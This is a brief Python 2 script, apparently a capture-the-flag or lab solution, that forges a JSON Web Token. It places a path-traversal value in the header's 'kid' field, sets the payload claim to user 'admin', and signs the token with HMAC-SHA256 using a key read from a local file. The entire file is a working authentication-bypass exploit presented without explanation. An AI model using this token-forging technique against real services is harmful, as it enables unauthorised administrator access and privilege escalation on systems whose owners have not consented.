import os
import hashlib
import hmac
import md5
import base64


# if algorithm == "HS256":

hmac_algorithm = hashlib.sha256


filename = "/tmp/magic"

if os.path.exists(filename):
   with open(filename, 'rb') as f:
      key = f.read()

header = '{"typ":"JWT","alg":"HS256","kid":"../../../etc/magic"}'
header = base64.b64encode(header).strip("=")
payload = '{"user":"admin"}'
payload = base64.b64encode(payload).strip("=")

contents = header + "." + payload 

signature = base64.b64encode( 
                            hmac.new(
                                    key, contents, hmac_algorithm
                                ).digest()
                    ).strip("=")

print signature
